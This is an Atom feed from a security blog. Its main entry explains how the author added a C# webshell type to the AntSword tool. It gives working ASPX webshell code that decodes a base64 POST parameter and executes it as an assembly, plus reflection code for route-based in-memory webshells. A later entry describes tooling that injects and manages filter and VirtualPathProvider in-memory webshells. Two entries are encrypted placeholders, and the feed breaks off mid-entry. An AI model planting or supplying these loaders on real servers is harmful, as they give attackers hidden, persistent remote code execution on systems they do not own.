<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>yzddMr6&#39;s Blog</title>
  
  <subtitle>脚本小子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yzddmr6.com/"/>
  <updated>2022-01-13T14:00:42.784Z</updated>
  <id>https://yzddmr6.com/</id>
  
  <author>
    <name>yzddMr6</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>聊聊新类型ASPXCSharp</title>
    <link href="https://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/"/>
    <id>https://yzddmr6.com/posts/聊聊新类型ASPXCSharp/</id>
    <published>2022-01-13T13:57:57.000Z</published>
    <updated>2022-01-13T14:00:42.784Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>最近花了点时间，给蚁剑加上了C#的shell类型。</p><p>其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有C#可以实现的功能：<a href="http://yzddmr6.com/posts/jscript-load-csharp-assembly/">http://yzddmr6.com/posts/jscript-load-csharp-assembly/</a></p><p>这次增加主要是有几点考虑：</p><ol><li><p>Jscript的shell出现很容易被杀。我还没有见过用jscript写的项目，web目录下面出现了Jscript文件99.99%就是webshell，特征更明显一些。</p></li><li><p>Jscript的语法属实恶心。没有啥文档，坑全部靠踩。</p></li><li><p>C#<a href="http://xn--asp-vs9dl2jpxe14hxkjj20f.net" target="_blank" rel="noopener">类型可以兼容asp.net</a> 各种内存马，Jscript无法做到。</p></li></ol><p>本文记录一下自己在开发设计的过程中，遇到的一些问题以及自己的思考。</p><h2 id="自定义类名">自定义类名</h2><p>其实一开始遇到的问题是无法自定义类名的问题。c#跟java有一点不同的是，java的newInstance是不需要指定type的，只要有Class对象就可以实例化。但是c#在实例化的时候必须要指定实例化的type，这也意味着我们所有的全限定类名必须要一样。</p><p>冰蝎默认类名都是U，就建在根命名空间下。每个payload是单独编译的。</p><p>哥斯拉同样采用了这种机制，实例化的类名是LY。但是因为哥斯拉采用的方式是一次性把payload都打到内存里然后反射调用，所以可以把所有的基础payload都编译到一个dll里面。</p><p>但是这样开发Payload的时候会很难受，因为在同一个项目下面都用一个固定的类名，编译器是会报冲突的。</p><p>后来想到了一种取巧的办法，用python命令行调用编译程序，在编译之前把类名都统一替换掉。暂时解决了问题，但是还是感觉不够优雅。</p><p>那么有没有什么办法可以动态获取到assembly的type呢？</p><p>翻了翻手册，发现以下方法</p><table><thead><tr><th><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.object.gettype?view=netframework-3.0#System_Object_GetType" target="_blank" rel="noopener">GetType()</a></th><th>获取当前实例的 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.type?view=netframework-3.0" target="_blank" rel="noopener">Type</a>。(继承自 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.object?view=netframework-3.0" target="_blank" rel="noopener">Object</a>)</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.gettypes?view=netframework-3.0#System_Reflection_Assembly_GetTypes" target="_blank" rel="noopener">GetTypes()</a></td><td>获取此程序集中定义的类型。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.getname?view=netframework-3.0#System_Reflection_Assembly_GetName" target="_blank" rel="noopener">GetName()</a></td><td>获取此程序集的 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assemblyname?view=netframework-3.0" target="_blank" rel="noopener">AssemblyName</a>。</td></tr></tbody></table><p>写代码测试一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String Payload = <span class="string">"xxx"</span>;</span><br><span class="line">System.Reflection.Assembly a = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">Console.WriteLine(<span class="string">"Assembly.GetName: "</span>+a.GetName());</span><br><span class="line">Console.WriteLine(<span class="string">"Assembly.GetName.Name: "</span>+a.GetName().Name);</span><br><span class="line">Console.WriteLine(<span class="string">"Assembly.GetType: "</span>+a.GetType());</span><br><span class="line">Console.WriteLine(<span class="string">"Assembly.GetTypes[0]: "</span>+a.GetTypes()[<span class="number">0</span>]);</span><br><span class="line">Console.WriteLine(<span class="string">"Assembly.GetTypes[0].FullName: "</span>+a.GetTypes()[<span class="number">0</span>].FullName);</span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Assembly.GetName: BASE_Info, Version=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, Culture=neutral, PublicKeyToken=null</span><br><span class="line">Assembly.GetName.Name: BASE_Info</span><br><span class="line">Assembly.GetType: System.Reflection.Assembly</span><br><span class="line">Assembly.GetTypes[<span class="number">0</span>]: BASE_Info.Run</span><br><span class="line">Assembly.GetTypes[<span class="number">0</span>].FullName: BASE_Info.Run</span><br></pre></td></tr></table></figure><p>Assembly.GetTypes返回的是一个列表，而payload里面我们通常只会定义一个类，所以可以通过Assembly.GetTypes[0]来获取payload类的type。</p><p>webshell中可以采用如下写法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"c#"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String Payload = Request.Form[<span class="string">"ant"</span>];</span><br><span class="line">    <span class="keyword">if</span> (Payload != null)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">        assembly.CreateInstance(assembly.GetTypes()[<span class="number">0</span>].FullName).Equals(Context);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里又跟java的defineClass不太一样，defineClass只能打进去一个类，而c#的Assembly.Load可以加载一个程序集，并不一定只是一个类。所以为了考虑今后payload里可能会有多个类的情况，推荐的写法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"c#"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String Payload = Request.Form[<span class="string">"ant"</span>];</span><br><span class="line">    <span class="keyword">if</span> (Payload != null)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">        assembly.CreateInstance(assembly.GetName().Name + <span class="string">".Run"</span>).Equals(Context);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>即强行指定实例化的类为命名空间下名为Run的类。</p><h2 id="兼容内存马">兼容内存马</h2><p>rebeyond大佬在最开始用加载assembly作为aspx类型的shell时，默认Equals里面是this对象。也就是Page对象。这种方式在aspx文件落地的情况下没有毛病，但是在内存马环境下，是没有Page对象的，这种办法也就不兼容。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png" alt="img"></p><p>微软文档如下图</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png" alt="img"></p><p>哥斯拉则对此进行了兼容处理，不再采用Page对象，而采用了兼容性更好的HttpContext</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png" alt="img"></p><p>其实入口参数的本质就是获取到当前的request跟response对象。</p><p>吸取了jsp的经验，一开始parseObj函数内置了三种方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseObj</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (obj.GetType().IsArray)<span class="comment">//直接数组传入</span></span><br><span class="line">            &#123;</span><br><span class="line">                Object[] data = (Object[])obj;</span><br><span class="line">                <span class="keyword">this</span>.Request = (HttpRequest)data[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">this</span>.Response = (HttpResponse)data[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Page page = (Page)obj;<span class="comment">//传入Page对象</span></span><br><span class="line">                    <span class="keyword">this</span>.Response = page.Response;</span><br><span class="line">                    <span class="keyword">this</span>.Request = page.Request;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception)</span><br><span class="line">                &#123;</span><br><span class="line">                    HttpContext context = (HttpContext)obj;<span class="comment">//传入HttpContext对象</span></span><br><span class="line">                    <span class="keyword">this</span>.Response = context.Response;</span><br><span class="line">                    <span class="keyword">this</span>.Request = context.Request;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>所以在shell中用以下写法均可连接</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用Page对象</span></span><br><span class="line">System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用Context对象</span></span><br><span class="line">System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(Context);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用数组</span></span><br><span class="line">System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(<span class="keyword">new</span> object[] &#123; Request, Response &#125;);</span><br></pre></td></tr></table></figure><p>以asp.net的Route内存马为例，从route上下文中获取到的Context是HttpContextBase，而不是HttpContext。具体的实现类为System.Web.HttpContextWrapper。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png" alt="img"></p><p>并且通过HttpContextWrapper.Request获取到的对象是HttpRequestBase，默认实现类是System.Web.HttpRequestWrapper。有点类似Tomcat的门面模式。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png" alt="img"></p><p>如果要采用数组的方式可以用以下反射代码实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FieldInfo requestField =</span><br><span class="line">    typeof(HttpRequestWrapper).GetField(<span class="string">"_httpRequest"</span>, BindingFlags.Instance | BindingFlags.NonPublic);</span><br><span class="line">HttpRequest httpRequest =</span><br><span class="line">    (HttpRequest)requestField.GetValue(httpContext.Request);</span><br><span class="line"></span><br><span class="line">FieldInfo responseField =</span><br><span class="line">    typeof(HttpResponseWrapper).GetField(<span class="string">"_httpResponse"</span>,</span><br><span class="line">        BindingFlags.Instance | BindingFlags.NonPublic);</span><br><span class="line">HttpResponse httpResponse =</span><br><span class="line">    (HttpResponse)responseField.GetValue(httpContext.Response);</span><br><span class="line">System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">assembly.CreateInstance(assembly.GetName().Name + <span class="string">".Run"</span>).Equals(<span class="keyword">new</span> object[] &#123; httpRequest, httpResponse &#125;);</span><br></pre></td></tr></table></figure><p>访问注入内存马的aspx，一片空白说明注入成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png" alt="img"></p><p>蚁剑中输入任意url，连接成功。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png" alt="img"></p><h2 id="进一步思考">进一步思考</h2><p>看起来不错了，但是还有继续优化的空间吗？</p><p>Java中一个比较著名的问题是内存马回显，实际上是如何从当前线程获取当前的request跟response对象。这个问题其实比较蛋疼，因为不同的容器有不同的实现细节，无法统一处理。</p><p>但是C#则直接把这个接口给暴露了出来，直接可以通过HttpContext.Current获取到当前的context，从而获取当前的request跟response对象。</p><p>再次改造之后，payload中parseObj如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseObj</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (obj.GetType().IsArray)</span><br><span class="line">            &#123;</span><br><span class="line">                Object[] data = (Object[])obj;</span><br><span class="line">                <span class="keyword">this</span>.Request = (HttpRequest)data[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">this</span>.Response = (HttpResponse)data[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    HttpContext context = (HttpContext)obj;</span><br><span class="line">                    <span class="keyword">this</span>.Response = context.Response;</span><br><span class="line">                    <span class="keyword">this</span>.Request = context.Request;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception)</span><br><span class="line">                &#123;</span><br><span class="line">                    HttpContext context = HttpContext.Current;</span><br><span class="line">                    <span class="keyword">this</span>.Response = context.Response;</span><br><span class="line">                    <span class="keyword">this</span>.Request = context.Request;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>改版后我们去掉了兼容性不强的Page方式，如果数组方式跟Context都无法获取的话，就尝试通过HttpContext.Current来拿到当前的Context。</p><p>所以其实在shell中直接Equals(null)，或者一个随意对象即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"c#"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String Payload = Request.Form[<span class="string">"ant"</span>];</span><br><span class="line">    <span class="keyword">if</span> (Payload != null)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">        assembly.CreateInstance(assembly.GetName().Name + <span class="string">".Run"</span>).Equals(null);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>同样可以连接成功</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png" alt="img"></p><p>至于为什么没有把原来的入口参数方式全部都去掉，是因为新类型并没有在实战环境中测试过。不知道会不会有一些特殊情况。为了谨慎起见，还是保留了原来的入口参数。</p><h2 id="最后">最后</h2><p>个人喜欢开发一些工具，同时记录下自己的碎碎念。如果能对你有帮助，那就最好不过了。</p><p>github地址：<a href="https://github.com/AntSwordProject/antSword/commit/d2d848c89e03088c20cc31f411e73fe2dd2973ea" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword/commit/d2d848c89e03088c20cc31f411e73fe2dd2973ea</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;最近花了点时间，给蚁剑加上了C#的shell类型。&lt;/p&gt;&lt;p&gt;其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ASP.NET下的内存马(二)：Route内存马的N种写法</title>
    <link href="https://yzddmr6.com/posts/ASP-NET%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9ARoute%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84N%E7%A7%8D%E5%86%99%E6%B3%95/"/>
    <id>https://yzddmr6.com/posts/ASP-NET下的内存马：Route内存马的N种写法/</id>
    <published>2021-12-26T14:09:43.000Z</published>
    <updated>2021-12-26T14:13:04.033Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ASP.NET下的内存马(一)：filter内存马</title>
    <link href="https://yzddmr6.com/posts/ASP-NET%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC-%E4%B8%80-%EF%BC%9Afilter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://yzddmr6.com/posts/ASP-NET下的内存马-一-：filter内存马/</id>
    <published>2021-12-18T05:07:00.000Z</published>
    <updated>2021-12-26T14:11:25.121Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>As-Exploits v1.4更新</title>
    <link href="https://yzddmr6.com/posts/As-Exploits-v1-4%E6%9B%B4%E6%96%B0/"/>
    <id>https://yzddmr6.com/posts/As-Exploits-v1-4更新/</id>
    <published>2021-07-25T12:18:00.000Z</published>
    <updated>2021-07-25T12:24:49.545Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="更新日志">更新日志</h2><h3 id="v-1-4-2021-7-24">v 1.4 (2021/7/24)</h3><ul><li>aspx新增 内存马 模块</li><li>aspx新增 内存马管理 模块</li><li>jsp新增filter内存马</li><li>jsp内存马管理模块增强，支持filter、servlet（thx: tomcat-memshell-killer项目）</li><li>新增 执行自定义payload 模块</li><li>解决html渲染中文乱码</li></ul><h2 id="JSP内存马模块增强">JSP内存马模块增强</h2><h3 id="filter内存马">filter内存马</h3><p>新增filter类型内存马。内存马会把自己放到filter的第一位，在遇到shiro框架的时候就不用填写登录Cookie了。</p><p>默认支持Tomcat以及Spring。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179455921-aad8b171-a960-4357-9bcf-5414194563fe.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179563752-a8fd988f-f0c1-43d7-8514-68dfde76f258.png" alt="image.png"></p><h3 id="内存马管理">内存马管理</h3><p>内存马管理模块核心payload移植了tomcat-memshell-killer的代码，是不是看起来更直观了？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179476764-f2de8d7d-1020-4591-8af3-a8f4dfe274bd.png" alt="image.png"></p><p>还可以贴心的判断有没有其他人的内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179587623-8194fe8f-87c4-407c-8fc9-3c57931b7984.png" alt="image.png"></p><p>卸载内存马填入Filter name即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179611709-bd09ea44-37a7-4f5e-a03f-974748411024.png" alt="image.png"></p><h2 id="ASPX内存马">ASPX内存马</h2><h3 id="内存马注入">内存马注入</h3><p>aspx内存马的核心代码来源于ysoserial.net的<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs" target="_blank" rel="noopener">GhostWebShell</a>，三好学生的博客中也有提到：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell" target="_blank" rel="noopener">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell</a></p><p>主要原理是利用了asp.net下虚拟文件的特性</p><blockquote><p>通过ASP.NET的VirtualPathProvider类能够创建虚拟文件，实现以下效果：虚拟文件不存在于服务器的文件系统，但是能够对其动态编译并提供访问服务。<a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial.net</a>的<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs" target="_blank" rel="noopener">GhostWebShell.cs</a>提供了一种可供学习的利用思路。</p></blockquote><p>可以直接定义要注入的shell内容，默认为普通一句话，当然也可以改成冰蝎哥斯拉之类的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179765626-66136998-2575-4ef2-beaa-6bcc28c9565e.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179862888-b1609644-61dc-4ea8-af77-148d0a35abc7.png" alt="image.png"></p><p>连接的时候可以把注入的路径后面加点随机字符串，当作一个文件</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180001637-136d2dfa-57f3-4275-95a1-c6eaba905fc4.png" alt="image.png"></p><p>也可以把注入的路径当作一个目录，在目录下面填写随机文件名</p><p>要注意的是必须要用.aspx结尾，因为映射的是一个文件，所以要用指定的后缀才能解析。</p><p>暂时不支持通配符模式</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180015916-f50040c7-66d2-4b87-a2ff-cc20066a76bd.png" alt="image.png"></p><h3 id="内存马管理-2">内存马管理</h3><p>内存马注入的payload大部分是抄的</p><p>内存马管理部分的payload主要是自己手搓的。研究一下发现VirtualPathProvider主要用到了类似单向链表的结构，不像Tomcat的内存马有一个Config去定义。获取所有组件需要遍历链表，卸载的时候需要修改当前指针指向来删除节点，梦回数据结构课堂。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179923401-b13951bc-928e-43ed-bd34-7f211778aff0.png" alt="image.png"></p><p>卸载指定VPP</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180069879-05fa3f9e-111c-4142-8c23-5bc57c998500.png" alt="image.png"></p><p>再次获取组件发现内存马已经被删除。</p><p>剩下的这个System.Web.Hosting.MapPathBasedVirtualPathProvider是IIS默认组件，删除之后网站会崩，请慎重操作。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180083261-4da646b8-d1ca-4e37-b439-1edf2c0be139.png" alt="image.png"></p><h2 id="自定义脚本执行">自定义脚本执行</h2><p>这个功能主要是为了方便调试</p><p>在JSP下需要填写base64格式的编译后的class文件</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179626094-bc9f8c33-7153-4efa-84ce-751d37c7a648.png" alt="image.png"></p><p>格式按照https://github.com/AntSwordProject/AntSword-JSP-Template项目去编写即可，这里以baseinfo为例：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179674263-ab17ae98-4519-473d-b60c-3c80d20c6322.png" alt="image.png"></p><h3 id="aspx">aspx</h3><p>aspx下就直接写jscript代码即可</p><p>如果想要调用C#的payload看我博客这篇文章：<a href="https://yzddmr6.tk/posts/jscript-load-csharp-assembly/" target="_blank" rel="noopener">https://yzddmr6.tk/posts/jscript-load-csharp-assembly/</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180137926-d97947ee-6d65-44e1-b2b5-62785fc43191.png" alt="image.png"></p><h3 id="php">php</h3><p>直接写php代码</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627183521659-3654ae47-bfbb-4241-be8c-cfc4c8d1b520.png" alt="image.png"></p><h2 id="项目地址">项目地址</h2><p><a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;更新日志&quot;&gt;更新日志&lt;/h2&gt;&lt;h3 id=&quot;v-1-4-2021-7-24&quot;&gt;v 1.4 (2021/7/24)&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;aspx新增 内存马 模块&lt;/li&gt;
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>一种新型Java一句话木马的实现</title>
    <link href="https://yzddmr6.com/posts/%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>https://yzddmr6.com/posts/一种新型Java一句话木马的实现/</id>
    <published>2021-06-19T05:05:00.000Z</published>
    <updated>2021-06-19T05:10:56.857Z</updated>
    
